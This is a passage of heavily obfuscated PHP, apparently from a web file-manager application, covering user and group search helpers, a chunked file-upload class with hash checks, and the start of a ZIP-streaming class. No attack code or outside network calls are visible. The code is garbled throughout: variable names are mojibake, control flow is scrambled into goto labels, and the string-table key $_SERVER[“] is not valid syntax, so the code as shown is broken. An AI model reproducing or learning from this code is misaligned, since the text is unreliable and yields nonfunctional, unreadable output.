$B‹—â•Ş¿´[$fÙÏÅÍ§çŞ[351]][$fÙÏÅÍ§çŞ[353]] = ceil($B‹—â•Ş¿´[$fÙÏÅÍ§çŞ[351]][$fÙÏÅÍ§çŞ[352]] / $B‹—â•Ş¿´[$fÙÏÅÍ§çŞ[351]][$fÙÏÅÍ§çŞ[349]]); } $this->_listDataApply($B‹—â•Ş¿´[$fÙÏÅÍ§çŞ[354]]); $this->_filterByGroup($B‹—â•Ş¿´, $AíÊÖÍ†…); goto a©÷…ªÉõ; d ™¢ãÎ: $fÙÏÅÍ§çŞ =& $_SERVER[“]; $bï£¾œ¶ŠÂ = $EÎ£ïø˜›ñ[$fÙÏÅÍ§çŞ[2176]]; $AíÊÖÍ†… = isset($EÎ£ïø˜›ñ[$fÙÏÅÍ§çŞ[2177]]) ? $EÎ£ïø˜›ñ[$fÙÏÅÍ§çŞ[2177]] : !1; goto dº¯šñ•È; a©÷…ªÉõ: return $B‹—â•Ş¿´; goto aïßÛòº«Å; dº¯šñ•È: $bï£¾œ¶ŠÂ = str_replace($fÙÏÅÍ§çŞ[2178], $fÙÏÅÍ§çŞ[2179], trim($bï£¾œ¶ŠÂ)); $c‰á—œƒ…ê = array($fÙÏÅÍ§çŞ[28] => array($fÙÏÅÍ§çŞ[735], "\45{$bï£¾œ¶ŠÂ}\x25"), $fÙÏÅÍ§çŞ[293] => array($fÙÏÅÍ§çŞ[735], "\x25{$bï£¾œ¶ŠÂ}\x25"), $fÙÏÅÍ§çŞ[2342] => array($fÙÏÅÍ§çŞ[735], "\x25{$bï£¾œ¶ŠÂ}\x25"), $fÙÏÅÍ§çŞ[900] => $fÙÏÅÍ§çŞ[2180]); if (Input::check($bï£¾œ¶ŠÂ, $fÙÏÅÍ§çŞ[299])) { $c‰á—œƒ…ê[$fÙÏÅÍ§çŞ[1423]] = array($fÙÏÅÍ§çŞ[735], "\45{$bï£¾œ¶ŠÂ}\x25"); $c‰á—œƒ…ê[$fÙÏÅÍ§çŞ[2519]] = array($fÙÏÅÍ§çŞ[735], "\x25{$bï£¾œ¶ŠÂ}\x25"); } goto CĞğÚºĞç’; CĞğÚºĞç’: if (!$bï£¾œ¶ŠÂ) { $c‰á—œƒ…ê = array(); } if (isset($EÎ£ïø˜›ñ[$fÙÏÅÍ§çŞ[673]])) { $c‰á—œƒ…ê[$fÙÏÅÍ§çŞ[673]] = $EÎ£ïø˜›ñ[$fÙÏÅÍ§çŞ[673]]; } $B‹—â•Ş¿´ = $this->_makeOrder()->where($c‰á—œƒ…ê)->selectPage(20); goto fÊò›ÔîŞŞ; aïßÛòº«Å: } private function _filterByGroup(&$cĞŠåæÉğ, $FÚ‰°Ùí«š) { $f·ë¨ºã»Ô =& $_SERVER[“]; if (!$FÚ‰°Ùí«š) { return $cĞŠåæÉğ; } foreach ($cĞŠåæÉğ[$f·ë¨ºã»Ô[354]] as $dèç•›İó => &$bšË°õÅéø) { $Dâ¥´“Æ«¼ = array_to_keyvalue($bšË°õÅéø[$f·ë¨ºã»Ô[2539]], $f·ë¨ºã»Ô[33], $f·ë¨ºã»Ô[2095]); if (!in_array($FÚ‰°Ùí«š, $Dâ¥´“Æ«¼)) { unset($cĞŠåæÉğ[$f·ë¨ºã»Ô[354]][$dèç•›İó]); } } $cĞŠåæÉğ[$f·ë¨ºã»Ô[354]] = array_values($cĞŠåæÉğ[$f·ë¨ºã»Ô[354]]); $cĞŠåæÉğ[$f·ë¨ºã»Ô[351]] = array($f·ë¨ºã»Ô[2317] => count($cĞŠåæÉğ[$f·ë¨ºã»Ô[354]]), $f·ë¨ºã»Ô[2315] => $cĞŠåæÉğ[$f·ë¨ºã»Ô[351]][$f·ë¨ºã»Ô[349]], $f·ë¨ºã»Ô[2314] => 1, $f·ë¨ºã»Ô[2316] => 1); } private function _searchFromMeta($E‡¦–æÃÖÕ, $EÙ‚éÅÖù•, $B…×²·ÙÇÉ) { goto AœƒÒ‰Ú‹„; Fİ°ˆˆöÖ: $a¸ÉíÙ¡‘ = Model($Fóé•êà‚‰[2540])->where($BíÙİÏÂò)->limit($B…×²·ÙÇÉ)->select(); if (!$a¸ÉíÙ¡‘) { return array(); } $a¸ÉíÙ¡‘ = array_to_keyvalue($a¸ÉíÙ¡‘, $Fóé•êà‚‰[33], $Fóé•êà‚‰[1423]); goto Fé¶¬Í®×„; AœƒÒ‰Ú‹„: $Fóé•êà‚‰ =& $_SERVER[“]; $EÙ‚éÅÖù• = strtolower($EÙ‚éÅÖù•); $BíÙİÏÂò = array($Fóé•êà‚‰[89] => $E‡¦–æÃÖÕ, $Fóé•êà‚‰[359] => array($Fóé•êà‚‰[735], "\45{$EÙ‚éÅÖù•}\45")); goto Fİ°ˆˆöÖ; Fé¶¬Í®×„: $dº‰Ò‹¾Ø = $this->where(array($Fóé•êà‚‰[1413] => array($Fóé•êà‚‰[7], $a¸ÉíÙ¡‘)))->select(); if (!$dº‰Ò‹¾Ø) { return array(); } return $dº‰Ò‹¾Ø; goto CÀ Œ÷æÊÂ; CÀ Œ÷æÊÂ: } private function _listDataApplyItem($Bó¶õ¤À¤Š) { $BÛğ®Ä²£† = array($Bó¶õ¤À¤Š); $this->_listDataApply($BÛğ®Ä²£†); return $BÛğ®Ä²£†[0]; } private function _listDataApply(&$Bò± ¨—è”) { goto D«…Ô›–õ; D«…Ô›–õ: $a‰›„Í°Œù =& $_SERVER[“]; if (!$Bò± ¨—è”) { return; } array_remove_key($Bò± ¨—è”, $a‰›„Í°Œù[788]); goto A‡Í°ğÀ³; c¨—øÓãÀÎ: $this->_listAppendSourceRoot($Bò± ¨—è”, $DŒ™°ëš¸); goto F ¡‹Œ‰é; A‡Í°ğÀ³: $DŒ™°ëš¸ = array_to_keyvalue($Bò± ¨—è”, $a‰›„Í°Œù[33], $a‰›„Í°Œù[1423]); $this->_listAppendGroup($Bò± ¨—è”, $DŒ™°ëš¸); $this->_listAppendMeta($Bò± ¨—è”, $DŒ™°ëš¸); goto c¨—øÓãÀÎ; F ¡‹Œ‰é: } private function _listAppendSourceRoot(&$f…°øÍğƒí, $E–¯«âé´Ô) { goto CË¢‘®ìÛ; Cº»äÌÅ´¥: foreach ($f…°øÍğƒí as &$EÛˆ±óñø¢) { $EÛˆ±óñø¢[$b™£¢È¬Ä[391]] = $b‚‘Òï–í[$EÛˆ±óñø¢[$b™£¢È¬Ä[1423]]] ? $b‚‘Òï–í[$EÛˆ±óñø¢[$b™£¢È¬Ä[1423]]] : array(); } goto b›Øù²µèç; D”Ëùğ³ƒ˜: $b‚‘Òï–í = Model($b™£¢È¬Ä[736])->order($b™£¢È¬Ä[2188])->field($f æºë¯¸Ş)->where($d¿Ìö £Ø)->select(); $b‚‘Òï–í = array_to_keyvalue($b‚‘Òï–í, $b™£¢È¬Ä[458]); $b‚‘Òï–í = array_remove_key($b‚‘Òï–í, $b™£¢È¬Ä[458]); goto Cº»äÌÅ´¥; CË¢‘®ìÛ: $b™£¢È¬Ä =& $_SERVER[“]; $d¿Ìö £Ø = array($b™£¢È¬Ä[463] => 0, $b™£¢È¬Ä[371] => SourceModel::TYPE_USER, $b™£¢È¬Ä[458] => array($b™£¢È¬Ä[7], $E–¯«âé´Ô)); $f æºë¯¸Ş = $b™£¢È¬Ä[2187]; goto D”Ëùğ³ƒ˜; b›Øù²µèç: } private function _listAppendGroup(&$Càíê’¸‡à, $F¼ÛĞØå‰ ) { goto D‰‹¡ÆÜ¡º; eñîš§İ¶²: $D‘ÛÒÁàÈ = array_to_keyvalue_group($D‘ÛÒÁàÈ, $D†‰ÈÖÎöï[1423]); foreach ($D‘ÛÒÁàÈ as &$cˆ‚¢è’) { $F´‡î•ñ½ = array(); foreach ($cˆ‚¢è’ as $DÇÑ­»ÁÕ·) { if (!$DÇÑ­»ÁÕ·[$D†‰ÈÖÎöï[2239]]) { continue; } $b¥¿Æà‚¦ = Model($D†‰ÈÖÎöï[2258])->listData($DÇÑ­»ÁÕ·[$D†‰ÈÖÎöï[2239]]); $F´‡î•ñ½[] = array($D†‰ÈÖÎöï[2095] => $DÇÑ­»ÁÕ·[$D†‰ÈÖÎöï[2095]], $D†‰ÈÖÎöï[2543] => $bö„Îøó®í[$DÇÑ­»ÁÕ·[$D†‰ÈÖÎöï[2095]]][$D†‰ÈÖÎöï[28]], $D†‰ÈÖÎöï[461] => $bö„Îøó®í[$DÇÑ­»ÁÕ·[$D†‰ÈÖÎöï[2095]]][$D†‰ÈÖÎöï[461]], $D†‰ÈÖÎöï[376] => $b¥¿Æà‚¦); } $cˆ‚¢è’ = $F´‡î•ñ½; } foreach ($Càíê’¸‡à as &$E²ïÛîÏÍ) { $E²ïÛîÏÍ[$D†‰ÈÖÎöï[2539]] = array(); if (isset($D‘ÛÒÁàÈ[$E²ïÛîÏÍ[$D†‰ÈÖÎöï[1423]]])) { $E²ïÛîÏÍ[$D†‰ÈÖÎöï[2539]] = $D‘ÛÒÁàÈ[$E²ïÛîÏÍ[$D†‰ÈÖÎöï[1423]]]; } } goto B½óë”Æ; D£ƒ¡â‰µ„: $c‡«ñ˜Œ™ = array_to_keyvalue($D‘ÛÒÁàÈ, $D†‰ÈÖÎöï[33], $D†‰ÈÖÎöï[2095]); $c‡«ñ˜Œ™ = array_remove_value(array_unique($c‡«ñ˜Œ™), $D†‰ÈÖÎöï[470]); if (!$c‡«ñ˜Œ™ || !$D‘ÛÒÁàÈ) { return; } goto fšÍŠ†ÓáÑ; D‰‹¡ÆÜ¡º: $D†‰ÈÖÎöï =& $_SERVER[“]; $f„À¯À¢Ç¹ = array($D†‰ÈÖÎöï[1423] => array($D†‰ÈÖÎöï[7], $F¼ÛĞØå‰ )); $D‘ÛÒÁàÈ = Model($D†‰ÈÖÎöï[2174])->where($f„À¯À¢Ç¹)->select(); goto D£ƒ¡â‰µ„; fšÍŠ†ÓáÑ: $f„À¯À¢Ç¹ = array($D†‰ÈÖÎöï[2095] => array($D†‰ÈÖÎöï[7], $c‡«ñ˜Œ™)); $bö„Îøó®í = Model($D†‰ÈÖÎöï[2541])->field($D†‰ÈÖÎöï[2542])->where($f„À¯À¢Ç¹)->select(); $bö„Îøó®í = array_to_keyvalue($bö„Îøó®í, $D†‰ÈÖÎöï[2095]); goto eñîš§İ¶²; B½óë”Æ: } private function _listAppendMeta(&$dñØÄÂƒ«ˆ, $FöœëØò¸) { goto FßÇä®˜; cĞ½®‘Â¨å: $b‹¼®‹š›Õ = array($E¸î±¼êØ˜[1423] => array($E¸î±¼êØ˜[7], $FöœëØò¸)); $cÄ –ùˆáÉ = Model($E¸î±¼êØ˜[2518])->where($b‹¼®‹š›Õ)->select(); $cÄ –ùˆáÉ = array_to_keyvalue_group($cÄ –ùˆáÉ, $E¸î±¼êØ˜[1423]); goto aĞ…”…—ßë; FßÇä®˜: $E¸î±¼êØ˜ =& $_SERVER[“]; $bÈ…‡ÅÔâ = UserJobModel::JOB_KEY; $eƒ‘Æ¿ŠÇ = array($E¸î±¼êØ˜[2521]); goto cĞ½®‘Â¨å; aĞ…”…—ßë: foreach ($cÄ –ùˆáÉ as &$EÃÅÚ¿ªé²) { $D¶ÇÃ°‹¡Ø = array(); foreach ($EÃÅÚ¿ªé² as $céœã ï„æ) { if (!in_array($céœã ï„æ[$E¸î±¼êØ˜[89]], $eƒ‘Æ¿ŠÇ)) { $D¶ÇÃ°‹¡Ø[$céœã ï„æ[$E¸î±¼êØ˜[89]]] = $céœã ï„æ[$E¸î±¼êØ˜[359]]; } } $EÃÅÚ¿ªé² = $D¶ÇÃ°‹¡Ø; } $A¾·×®½ù = Model($E¸î±¼êØ˜[2544]); foreach ($dñØÄÂƒ«ˆ as &$c¼ãä…ğ—¯) { $EŒŞÇŠ¥¹æ = array(); if (isset($cÄ –ùˆáÉ[$c¼ãä…ğ—¯[$E¸î±¼êØ˜[1423]]])) { $EŒŞÇŠ¥¹æ = $cÄ –ùˆáÉ[$c¼ãä…ğ—¯[$E¸î±¼êØ˜[1423]]]; } $c¼ãä…ğ—¯[$E¸î±¼êØ˜[2545]] = array(); if (isset($EŒŞÇŠ¥¹æ[$bÈ…‡ÅÔâ])) { $c¼ãä…ğ—¯[$E¸î±¼êØ˜[2545]] = $A¾·×®½ù->getUserJobInfo($EŒŞÇŠ¥¹æ[$bÈ…‡ÅÔâ]); } } goto d®±ô·Ö×; d®±ô·Ö×: } protected function groupUserAll($cÅˆÛÉ†±) { $E—ŒÀõêé¼ =& $_SERVER[“]; if (!$cÅˆÛÉ†±) { return !1; } $F¾Ù”®Ä³ = Model($E—ŒÀõêé¼[2174])->field($E—ŒÀõêé¼[1423])->where(array($E—ŒÀõêé¼[2095] => array($E—ŒÀõêé¼[7], $cÅˆÛÉ†±)))->select(); $F¾Ù”®Ä³ = array_to_keyvalue($F¾Ù”®Ä³, $E—ŒÀõêé¼[33], $E—ŒÀõêé¼[1423]); return array_unique($F¾Ù”®Ä³); } public function userSearch($aâ‰‘„Üø, $dËÜ„âˆøí = "\x2a") { return Model($_SERVER[“][479])->where($aâ‰‘„Üø)->field($dËÜ„âˆøí)->find(); } } goto aÍåâÇ„ï²; fËâ¶ô±„: if (class_exists($_SERVER[“][1956])) { class Services_JSON_Error extends PEAR_Error { function __construct($Cóò”ÙŸ¬ = "\165\x6e\153\156\157\x77\156\x20\x65\162\x72\x6f\x72", $F£êß†à…Œ = null, $bğ©Ôó˜ÖÏ = null, $fƒ³ó®Ïæä = null, $DØÛ¹µ¢·Â = null) { parent::PEAR_Error($Cóò”ÙŸ¬, $F£êß†à…Œ, $bğ©Ôó˜ÖÏ, $fƒ³ó®Ïæä, $DØÛ¹µ¢·Â); } } } else { class Services_JSON_Error { function __construct($D‘ä”¯íò¤ = "\165\156\153\x6e\157\167\x6e\x20\x65\162\162\x6f\162", $FˆùàÅ’à¶ = null, $b½¤Æ¾ŸÛÒ = null, $D‰À…·—Š = null, $A¤Ø¿’éÂ¯ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto A½§ ¦¨Á; d×¾Á‰šò: if (!empty($_FILES)) { $BËñ¥×¨ƒ¸ = $_FILES[$fÍÌõ™Ù¦¥[167]]; $this->uploadFile = $BËñ¥×¨ƒ¸[$fÍÌõ™Ù¦¥[1957]]; if (!$this->uploadFile && $BËñ¥×¨ƒ¸[$fÍÌõ™Ù¦¥[1206]] > 0) { show_json($this->errorInfo($BËñ¥×¨ƒ¸[$fÍÌõ™Ù¦¥[1206]]), !1); } } else { if (isset($in[$fÍÌõ™Ù¦¥[386]])) { $this->uploadFile = isset($in[$fÍÌõ™Ù¦¥[1958]]) ? $fÍÌõ™Ù¦¥[1959] : $fÍÌõ™Ù¦¥[1802]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto dâ‹¥©†ã™; A½§ ¦¨Á: $fÍÌõ™Ù¦¥ =& $_SERVER[“]; global $in; $this->in =& $in; goto d×¾Á‰šò; dâ‹¥©†ã™: $this->checkSize(); $this->tempPathInit(); goto F¿Ÿõ±î½æ; F¿Ÿõ±î½æ: } public function upload() { goto A•§Ã¶ÓËÇ; BÏÀö£ÎŒ: ignore_timeout(); if (!$this->checkChunkHash($aè…Ê¦ƒ¸å)) { $this->showJson($aò»¾‚Ğ…[1974], !1); } $this->statusSet(!1); goto BùôŞº”äí; EÚåÖ½âÀ«: $CÍ›ˆ§Õ±… = $this->writeTo($Cß£Şä‰êÚ, $f“ğ»ø„÷’, $this->tempFile); $còÛäœ¢™ö = IO::hashSimple($Cß£Şä‰êÚ); $cÖƒãÑÂ ÷ = IO::size($Cß£Şä‰êÚ); goto cëªÙ¾‚ö; B­îŞÍŞ¦Ô: CacheLock::lock($this->tempFile, 20); $aè…Ê¦ƒ¸å = $this->statusGet(); $this->initFileTemp(); goto Bš¶Şìšªƒ; cëªÙ¾‚ö: @unlink($Cß£Şä‰êÚ); if (!$CÍ›ˆ§Õ±…) { $this->showJson($aò»¾‚Ğ…[1968] . $Dé–ÈÖõ¬, !1); } $aè…Ê¦ƒ¸å[$aò»¾‚Ğ…[1969]] = $a¬ôîÇ´ª; goto f§¤í˜­ñ¤; BùôŞº”äí: CacheLock::unlock($this->tempFile); return $this->tempFile; goto bİºª·åªÍ; Bš¶Şìšªƒ: $Cß£Şä‰êÚ = $this->moveUploadedFile($AÖÓÄÎâö¡); if ($cÖƒãÑÂ ÷ > 0 && filesize($Cß£Şä‰êÚ) == 0) { $this->showJson($aò»¾‚Ğ…[1965], !1); } if (!$Cß£Şä‰êÚ) { $this->showJson(LNG($aò»¾‚Ğ…[1966]), !1); } goto cˆ…Šä»È; cˆ…Šä»È: $d’Ş‹Õîñ½ = $Dé–ÈÖõ¬ * $CãÄº¹‚ÙŒ; $f“ğ»ø„÷’ = @fopen($this->tempFile, $aò»¾‚Ğ…[1967]); fseek($f“ğ»ø„÷’, $d’Ş‹Õîñ½); goto EÚåÖ½âÀ«; Aôİ›È‚¨: $AÖÓÄÎâö¡ = $this->tempFile . $aò»¾‚Ğ…[1962] . $Dé–ÈÖõ¬; $cÖƒãÑÂ ÷ = isset($this->in[$aò»¾‚Ğ…[522]]) ? intval($this->in[$aò»¾‚Ğ…[522]]) : 0; $CãÄº¹‚ÙŒ = isset($this->in[$aò»¾‚Ğ…[1963]]) ? intval($this->in[$aò»¾‚Ğ…[1963]]) : 0; goto AçÉÈªø—š; A•§Ã¶ÓËÇ: $aò»¾‚Ğ… =& $_SERVER[“]; $Dé–ÈÖõ¬ = isset($this->in[$aò»¾‚Ğ…[1960]]) ? intval($this->in[$aò»¾‚Ğ…[1960]]) : 0; $a¬ôîÇ´ª = isset($this->in[$aò»¾‚Ğ…[1961]]) ? intval($this->in[$aò»¾‚Ğ…[1961]]) : 1; goto Aôİ›È‚¨; f§¤í˜­ñ¤: $aè…Ê¦ƒ¸å[$aò»¾‚Ğ…[1970]][$aò»¾‚Ğ…[1971] . $Dé–ÈÖõ¬] = array($aò»¾‚Ğ…[1972] => $d’Ş‹Õîñ½, $aò»¾‚Ğ…[1023] => $Dé–ÈÖõ¬, $aò»¾‚Ğ…[77] => $cÖƒãÑÂ ÷, $aò»¾‚Ğ…[164] => $còÛäœ¢™ö); $this->statusSet($aè…Ê¦ƒ¸å); if (count($aè…Ê¦ƒ¸å[$aò»¾‚Ğ…[1970]]) != $aè…Ê¦ƒ¸å[$aò»¾‚Ğ…[1969]]) { $this->showJson($aò»¾‚Ğ…[1973] . $Dé–ÈÖõ¬, !0); } goto BÏÀö£ÎŒ; AçÉÈªø—š: if ($a¬ôîÇ´ª > 1 && $CãÄº¹‚ÙŒ <= 0) { show_json($aò»¾‚Ğ…[1964], !1); } if ($CãÄº¹‚ÙŒ > $cÖƒãÑÂ ÷) { $a¬ôîÇ´ª = 1; } if ($a¬ôîÇ´ª <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto B­îŞÍŞ¦Ô; bİºª·åªÍ: } private function checkSize() { $dÄÅøä¥ó« =& $_SERVER[“]; if (phpBuild64() || $this->in[$dÄÅøä¥ó«[77]] < PHP_INT_MAX) { return; } show_json(LNG($dÄÅøä¥ó«[1975]), !1); } private function showJson($a¸·Ş”Ææ‰, $fÍÃùñ¬ÓÔ) { CacheLock::unlock($this->tempFile); if (!$fÍÃùñ¬ÓÔ) { return show_json($a¸·Ş”Ææ‰, $fÍÃùñ¬ÓÔ); } show_json($a¸·Ş”Ææ‰, $fÍÃùñ¬ÓÔ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto cğ£÷ƒ—ë; e‘…õ«¿ŞÁ: touch($DÙ¡ßÌÂÈî . $B‚Ú®Íæ“[1976]); $D´Õ¦ˆ±¾ = isset($this->in[$B‚Ú®Íæ“[1977]]) ? $this->in[$B‚Ú®Íæ“[1977]] : !1; if (strlen($D´Õ¦ˆ±¾) < 30) { $D´Õ¦ˆ±¾ = md5(USER_ID . $this->in[$B‚Ú®Íæ“[75]] . $this->fileName . $this->in[$B‚Ú®Íæ“[77]]); } goto Fºƒ¢å–Š´; cğ£÷ƒ—ë: $B‚Ú®Íæ“ =& $_SERVER[“]; $DÙ¡ßÌÂÈî = TEMP_FILES; @mk_dir($DÙ¡ßÌÂÈî); goto e‘…õ«¿ŞÁ; Fºƒ¢å–Š´: $this->tempFile = $DÙ¡ßÌÂÈî . $B‚Ú®Íæ“[1978] . md5($D´Õ¦ˆ±¾ . $this->in[$B‚Ú®Íæ“[1518]]); goto céß—÷¹¥; céß—÷¹¥: } private function moveUploadedFile($EÃ¡øâ¬Ï) { $dÁœÌÆî—ì =& $_SERVER[“]; $DÀÑÒ‡ÏÆ = $this->uploadFile; if ($DÀÑÒ‡ÏÆ == $dÁœÌÆî—ì[1979]) { @file_put_contents($EÃ¡øâ¬Ï, base64_decode($_REQUEST[$dÁœÌÆî—ì[1980]])); } else { if ($DÀÑÒ‡ÏÆ == $dÁœÌÆî—ì[1802]) { $eë¨ªâ‚„Ú = @fopen($EÃ¡øâ¬Ï, $dÁœÌÆî—ì[1508]); $this->writeTo($DÀÑÒ‡ÏÆ, $eë¨ªâ‚„Ú, $EÃ¡øâ¬Ï); } else { if (!move_uploaded_file($DÀÑÒ‡ÏÆ, $EÃ¡øâ¬Ï)) { return !1; } } } return $EÃ¡øâ¬Ï; } private function writeTo($dƒæåŠ”–¨, $eµÖğÅ“¹, $D‹óØ™ÒÎÇ) { goto eï”Œ–‹Œï; eï”Œ–‹Œï: $Cİ§’¡›Ú =& $_SERVER[“]; $aËïà¸˜‚É = $Cİ§’¡›Ú[1981] . $D‹óØ™ÒÎÇ; $B¹ÂöèŸ = CacheLock::lock($aËïà¸˜‚É, 1); goto cØª†Ùñ«¤; cØª†Ùñ«¤: $EÕ½ğÄÑÅ¿ = @fopen($dƒæåŠ”–¨, $Cİ§’¡›Ú[1507]); if (!$EÕ½ğÄÑÅ¿ || !$eµÖğÅ“¹ || !$B¹ÂöèŸ) { CacheLock::unlock($aËïà¸˜‚É); return !1; } while (!feof($EÕ½ğÄÑÅ¿)) { fwrite($eµÖğÅ“¹, fread($EÕ½ğÄÑÅ¿, 1024 * 200)); } goto c”ö‡‰Ÿœ; dËŠ÷É‹¥®: return !0; goto D¯©‚–‹ ƒ; c”ö‡‰Ÿœ: fclose($EÕ½ğÄÑÅ¿); fclose($eµÖğÅ“¹); CacheLock::unlock($aËïà¸˜‚É); goto dËŠ÷É‹¥®; D¯©‚–‹ ƒ: } private function statusGet() { goto EÚËËÍö‘Í; f§ô… ÌÃ: $D¼õŞ˜ÛÎÒ = !1; if (file_exists($b¤õˆ’ãŠ)) { $D¼õŞ˜ÛÎÒ = @file_get_contents($b¤õˆ’ãŠ); } if ($D¼õŞ˜ÛÎÒ) { $this->statusData = json_decode($D¼õŞ˜ÛÎÒ, !0); } goto b¿Ğø°§‚Â; EÚËËÍö‘Í: $BÇø°ôµë =& $_SERVER[“]; if (is_array($this->statusData)) { return $this->statusData; } $b¤õˆ’ãŠ = $this->tempFile . $BÇø°ôµë[1982]; goto f§ô… ÌÃ; b¿Ğø°§‚Â: if (!$this->statusData) { $aÉâÏŠˆ˜„ = array($BÇø°ôµë[28] => $this->fileName, $BÇø°ôµë[1969] => 0, $BÇø°ôµë[1970] => array()); $this->statusSet($aÉâÏŠˆ˜„); } return $this->statusData; goto D‰ƒ»‚òÊ; D‰ƒ»‚òÊ: } public function statusSet($dÜ…éÒØ¤Ì) { $EŒß“˜•Õ’ = $this->tempFile . $_SERVER[“][1982]; if (!$dÜ…éÒØ¤Ì) { if (file_exists($EŒß“˜•Õ’)) { @unlink($EŒß“˜•Õ’); } return !0; } $this->statusData = $dÜ…éÒØ¤Ì; return file_put_contents($EŒß“˜•Õ’, json_encode($dÜ…éÒØ¤Ì)); } private function initFileTemp() { $e„ ç¢Ğï =& $_SERVER[“]; if (file_exists($this->tempFile)) { return; } $fŞµÄ¥· = fopen($this->tempFile, $e„ ç¢Ğï[1983]); fseek($fŞµÄ¥·, $this->in[$e„ ç¢Ğï[77]] - 1, SEEK_SET); fwrite($fŞµÄ¥·, $e„ ç¢Ğï[470]); fclose($fŞµÄ¥·); } public function checkChunk() { goto fŒàÜ¢ó†”; fŒàÜ¢ó†”: $Dç­Ëï§™Ä =& $_SERVER[“]; $B£‡óË‚Š  = array(); CacheLock::lock($this->tempFile); goto A‚âÅ•Î‡; A‚âÅ•Î‡: $dÁÂÚâ‘Ê = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($dÁÂÚâ‘Ê[$Dç­Ëï§™Ä[1970]] as $D×àÑ¶Úä) { $dÅ¨ÚàÏ«– = $D×àÑ¶Úä[$Dç­Ëï§™Ä[164]]; if ($dÅ¨ÚàÏ«–) { $B£‡óË‚Š [$Dç­Ëï§™Ä[1984] . $D×àÑ¶Úä[$Dç­Ëï§™Ä[1023]]] = $dÅ¨ÚàÏ«–; } } goto B˜œ’‡‘µ; B˜œ’‡‘µ: return $B£‡óË‚Š ; goto dƒˆµº‡¬; dƒˆµº‡¬: } private function checkChunkHash($C’È©¨°©) { goto AÄÅù‘Ú‡; AÄÅù‘Ú‡: $Dˆñİ£à×– =& $_SERVER[“]; if (count($C’È©¨°©[$Dˆñİ£à×–[1970]]) != $C’È©¨°©[$Dˆñİ£à×–[1969]]) { return !1; } $CÓ² ËÏå· = _get($this->in, $Dˆñİ£à×–[1977]); goto FĞ¶ÜÕ¨ï¯; FĞ¶ÜÕ¨ï¯: $bˆÛíáÔÈ = _get($this->in, $Dˆñİ£à×–[1985]); if (strlen($bˆÛíáÔÈ) == 32 && IO::hashSimple($this->tempFile) == $CÓ² ËÏå· && IO::hashMd5($this->tempFile) == $bˆÛíáÔÈ) { return !0; } $eœÜÑ‹…Ü‚ = fopen($this->tempFile, $Dˆñİ£à×–[1157]); goto Cæ“¨”íÖÛ; CÃÆæÈÂ‚: return $E–œÂÁ¡™Á; goto DÊ‚ê¬–Ä ; Cæ“¨”íÖÛ: $E–œÂÁ¡™Á = !0; foreach ($C’È©¨°©[$Dˆñİ£à×–[1970]] as $A¸÷¤ê„˜) { fseek($eœÜÑ‹…Ü‚, $A¸÷¤ê„˜[$Dˆñİ£à×–[1972]]); $AÄê“µ Í‰ = PathDriverStream::hash($eœÜÑ‹…Ü‚, $A¸÷¤ê„˜[$Dˆñİ£à×–[77]]); if ($A¸÷¤ê„˜[$Dˆñİ£à×–[164]] != $AÄê“µ Í‰) { $E–œÂÁ¡™Á = !1; break; } } fclose($eœÜÑ‹…Ü‚); goto CÃÆæÈÂ‚; DÊ‚ê¬–Ä : } public static function fileName() { goto d©”èëìÎÜ; b¥Í£¾¼¯õ: return KodIO::clear($d†ÎÃ‚°Ä²); goto cš‰×ƒÒµ; a¼‡•ğâ‘: if (!empty($_FILES)) { $d†ÎÃ‚°Ä² = $d†ÎÃ‚°Ä² ? $d†ÎÃ‚°Ä² : $_FILES[$dŸíêÔÉ×[167]][$dŸíêÔÉ×[386]]; } if (!is_wap()) { return KodIO::clear($d†ÎÃ‚°Ä²); } $cƒä‚ò‰Ÿ = strtotime($in[$dŸíêÔÉ×[1986]]); goto a×Æ…Õ¥ÕÒ; a×Æ…Õ¥ÕÒ: $cƒä‚ò‰Ÿ = $cƒä‚ò‰Ÿ ? $cƒä‚ò‰Ÿ : time(); $f‚Şìß×íä = strtolower($d†ÎÃ‚°Ä²); if ($f‚Şìß×íä == $dŸíêÔÉ×[1987] || $f‚Şìß×íä == $dŸíêÔÉ×[1988]) { $d†ÎÃ‚°Ä² = date($dŸíêÔÉ×[674], $cƒä‚ò‰Ÿ) . $dŸíêÔÉ×[70] . $in[$dŸíêÔÉ×[77]] . $dŸíêÔÉ×[1615]; } else { if ($f‚Şìß×íä == $dŸíêÔÉ×[1989]) { $d†ÎÃ‚°Ä² = date($dŸíêÔÉ×[674], $cƒä‚ò‰Ÿ) . $dŸíêÔÉ×[70] . $in[$dŸíêÔÉ×[77]] . $dŸíêÔÉ×[1990]; } } goto b¥Í£¾¼¯õ; d©”èëìÎÜ: $dŸíêÔÉ× =& $_SERVER[“]; global $in; $d†ÎÃ‚°Ä² = isset($in[$dŸíêÔÉ×[28]]) ? $in[$dŸíêÔÉ×[28]] : $dŸíêÔÉ×[33]; goto a¼‡•ğâ‘; cš‰×ƒÒµ: } private function errorInfo($eô‡¯Ø‘¿ƒ) { $D”õ×›§âœ =& $_SERVER[“]; $b‡ÃÓ¯¸ªì = array($D”õ×›§âœ[1991], $D”õ×›§âœ[1992], $D”õ×›§âœ[1993], $D”õ×›§âœ[1994], $D”õ×›§âœ[1995], $D”õ×›§âœ[1996], $D”õ×›§âœ[1997], $D”õ×›§âœ[1998]); return $eô‡¯Ø‘¿ƒ . $D”õ×›§âœ[4] . $b‡ÃÓ¯¸ªì[$eô‡¯Ø‘¿ƒ]; } } class ZipMake { const VERSION = "\60\x2e\62\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($E³µ–ë˜Â = null) { $F‚æ¸ŸÔá =& $_SERVER[“]; $this->outputStream = fopen($F‚æ¸ŸÔá[1999], $F‚æ¸ŸÔá[1213]); $this->outputName = $E³µ–ë˜Â; $this->needHeaders = !0; } public function addFile($f‚¹–‚¨•£, 